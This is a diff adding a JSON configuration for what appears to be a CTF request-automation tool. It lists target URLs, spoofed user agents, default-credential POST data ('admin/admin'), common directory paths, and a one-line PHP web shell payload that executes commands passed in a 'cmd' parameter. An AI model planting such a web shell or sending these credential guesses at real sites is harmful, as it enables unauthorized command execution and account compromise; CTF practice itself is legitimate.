@@ -1,0 +1,30 @@
+{
+    "flag_format": "CTF",
+    "urls": [
+        "http://4chan.org",
+        "https://youtube.com/"
+    ],
+    "urls_file": "examples/urls.txt",
+    "user_agents": [
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
+        "Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1"
+    ],
+    "user_agents_file": "examples/user_agents.txt",
+    "post_request_data": [
+        "user=admin&password=admin",
+        "flag{xxx}"
+    ],
+    "post_request_data_file": "examples/post_data.txt",
+    "request_dir":[
+        "login",
+        "signup",
+        "dashboard"
+    ],
+    "request_dir_file": "examples/commons.txt",
+    "payload": [
+        "<?php system($_GET['cmd']);?>"
+    ],
+    "payload_file": "examples/payload.txt",
+    "sleep":1,
+    "timeout":180
+}
